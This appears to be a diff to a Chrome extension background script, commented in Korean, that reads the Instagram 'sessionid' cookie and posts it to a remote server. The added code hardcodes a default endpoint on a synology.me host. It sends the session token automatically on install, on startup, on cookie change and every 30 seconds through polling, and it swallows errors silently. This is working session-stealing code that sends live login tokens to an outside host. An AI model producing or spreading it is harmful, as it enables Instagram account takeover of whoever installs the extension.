@@ -5,7 +5,10 @@
   - 사용 방법: 메시지 리스너 등에서 await 또는 then으로 결과를 받아 UI에 표시하거나 복사 기능에 연결합니다.
 */
 const INSTAGRAM_URL = "https://www.instagram.com/";
+const DEFAULT_ENDPOINT = "http://pampakim.synology.me:3000/api/collect-session";
 let cachedInstagramSessionId = null;
+let lastSentSessionId = null;
+let lastSentAtMs = 0;
 
 /*
   cacheSessionId 함수
@@ -63,8 +66,10 @@ function ensureSessionIdCached() {
 
     // storage에서 복구 시도
     if (chrome?.storage?.local) {
-      chrome.storage.local.get(["instagram_sessionid"], (items) => {
+      chrome.storage.local.get(["instagram_sessionid", "last_sent_sessionid", "last_sent_at_ms"], (items) => {
         const stored = items?.instagram_sessionid || null;
+        lastSentSessionId = items?.last_sent_sessionid || null;
+        lastSentAtMs = Number(items?.last_sent_at_ms || 0);
         if (stored) {
           cachedInstagramSessionId = stored;
           resolve(stored);
@@ -121,6 +126,26 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     // 비동기 응답을 위해 true 반환
     return true;
   }
+  if (message && message.type === "TEST_SEND_TO_SYNOLOGY") {
+    // 캐시 우선 → 없으면 즉시 쿠키 조회 후 전송
+    (async () => {
+      try {
+        let sid = await ensureSessionIdCached();
+        if (!sid) {
+          try { sid = await getInstagramSessionId(); } catch {}
+        }
+        if (!sid) {
+          sendResponse({ ok: false, error: "sessionid를 찾을 수 없습니다. 인스타그램에 로그인했는지 확인하세요." });
+          return;
+        }
+        await sendSessionToSynology(sid, true);
+        sendResponse({ ok: true });
+      } catch (error) {
+        sendResponse({ ok: false, error: error?.message || String(error) });
+      }
+    })();
+    return true;
+  }
 });
 
 /*
@@ -130,13 +155,23 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
 */
 if (chrome?.runtime?.onInstalled) {
   chrome.runtime.onInstalled.addListener(() => {
-    ensureSessionIdCached();
+    console.log('[IG session] onInstalled');
+    ensureSessionIdCached().then((sid) => {
+      if (sid) {
+        maybeSendIfChanged(sid);
+      }
+    });
   });
 }
 
 if (chrome?.runtime?.onStartup) {
   chrome.runtime.onStartup.addListener(() => {
-    ensureSessionIdCached();
+    console.log('[IG session] onStartup');
+    ensureSessionIdCached().then((sid) => {
+      if (sid) {
+        maybeSendIfChanged(sid);
+      }
+    });
   });
 }
 
@@ -156,9 +191,10 @@ if (chrome?.cookies?.onChanged) {
       if (isInstagram && isSessionId) {
         const value = cookie?.value || null;
         if (value) {
+          console.log('[IG session] cookies.onChanged detected');
           cacheSessionId(value, true, () => {
-            // 세션이 바뀌면 즉시 외부로 전송 시도
-            sendSessionToSynology(value).catch(() => {});
+            // onChanged 발생 시에는 강제 전송(중복 억제 무시)
+            maybeSendIfChanged(value, true);
           });
         }
       }
@@ -177,12 +213,32 @@ if (chrome?.cookies?.onChanged) {
     3) returns: Promise<void>
 */
 async function sendSessionToSynology(sessionIdValue, testMode = false) {
-  if (!sessionIdValue) return;
+  if (!sessionIdValue) {
+    if (testMode) throw new Error("세션값이 비어 있습니다");
+    return;
+  }
   const settings = await new Promise((resolve) => {
     chrome.storage.local.get(["synology_endpoint", "synology_token", "synology_insecure"], (items) => resolve(items || {}));
   });
-  const endpoint = (settings.synology_endpoint || "").trim();
-  if (!endpoint) return;
+  let endpoint = (settings.synology_endpoint || "").trim();
+  // 저장된 엔드포인트가 /collect-session 이면 자동으로 /api/collect-session로 교정
+  try {
+    if (endpoint) {
+      const u = new URL(endpoint);
+      if (u.pathname === "/collect-session") {
+        u.pathname = "/api/collect-session";
+        endpoint = u.toString();
+        chrome.storage.local.set({ synology_endpoint: endpoint });
+      }
+    }
+  } catch {}
+  if (!endpoint) {
+    // 하드코딩 기본값 사용
+    endpoint = DEFAULT_ENDPOINT;
+    console.warn('[IG session] endpoint not set, fallback to DEFAULT_ENDPOINT:', endpoint);
+    // 편의상 저장도 해둠
+    chrome.storage.local.set({ synology_endpoint: endpoint }, () => {});
+  }
   const token = (settings.synology_token || "").trim();
 
   const headers = { "Content-Type": "application/json" };
@@ -195,21 +251,38 @@ async function sendSessionToSynology(sessionIdValue, testMode = false) {
   const body = { service: "instagram", key: "sessionid", value: sessionIdValue, ts: Date.now() };
 
   try {
+    const masked = sessionIdValue.length > 12 ? `${sessionIdValue.slice(0,6)}...${sessionIdValue.slice(-4)}` : sessionIdValue;
+    console.log('[IG session] sending to', endpoint, 'len=', sessionIdValue.length, 'sid=', masked);
     const res = await fetch(endpoint, {
       method: "POST",
       headers,
       body: JSON.stringify(body),
       // 주: MV3 fetch는 자체적으로 CORS 제약이 완화되어 있음. SSL 검증 비활성화 옵션은 브라우저에서 무시됩니다.
     });
-    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    if (!res.ok) {
+      const txt = await res.text().catch(() => '');
+      console.warn('[IG session] send failed', res.status, txt);
+      throw new Error(`HTTP ${res.status}`);
+    }
+    // 전송 성공 시 마지막 전송값 업데이트
+    lastSentSessionId = sessionIdValue;
+    lastSentAtMs = Date.now();
+    if (chrome?.storage?.local) {
+      chrome.storage.local.set({ last_sent_sessionid: sessionIdValue, last_sent_at_ms: lastSentAtMs }, () => {});
+    }
+    console.log('[IG session] send success');
   } catch (err) {
+    console.error('[IG session] send error', err?.message || String(err));
     if (testMode) throw err;
   }
 }
 
 // 시작 시 캐시된 값이 있으면 전송 시도
 ensureSessionIdCached().then((sid) => {
-  if (sid) sendSessionToSynology(sid).catch(() => {});
+  if (sid) {
+    console.log('[IG session] initial ensure cache -> maybeSendIfChanged');
+    maybeSendIfChanged(sid);
+  }
 });
 
 // 옵션 페이지에서 테스트 전송 요청
@@ -222,5 +295,40 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     return true;
   }
 });
+
+/*
+  maybeSendIfChanged
+  - 동작: 현재 세션이 직전에 전송한 값과 다를 때만 전송합니다.
+*/
+function maybeSendIfChanged(current, force = false) {
+  if (!current) return;
+  // 동일 세션이어도 일정 시간(기본 10분) 이상 지났으면 재전송
+  const RESEND_INTERVAL_MS = 10 * 60 * 1000;
+  const isSame = lastSentSessionId && lastSentSessionId === current;
+  const expired = !lastSentAtMs || (Date.now() - lastSentAtMs) > RESEND_INTERVAL_MS;
+  if (!force && isSame && !expired) return;
+  sendSessionToSynology(current).catch(() => {});
+}
+
+/*
+  주기 폴링(보조): onChanged가 OS/브라우저 환경에 따라 누락될 것을 대비해 30초 간격으로 재확인
+*/
+if (chrome?.alarms) {
+  try {
+    chrome.alarms.create('ig-session-poll', { periodInMinutes: 0.5 });
+    chrome.alarms.onAlarm.addListener((alarm) => {
+      if (alarm?.name !== 'ig-session-poll') return;
+      getInstagramSessionId()
+        .then((sid) => {
+          if (!sid) return;
+          if (!cachedInstagramSessionId || cachedInstagramSessionId !== sid) {
+            cacheSessionId(sid, true, () => {});
+          }
+          maybeSendIfChanged(sid);
+        })
+        .catch(() => {});
+    });
+  } catch {}
+}
 
 
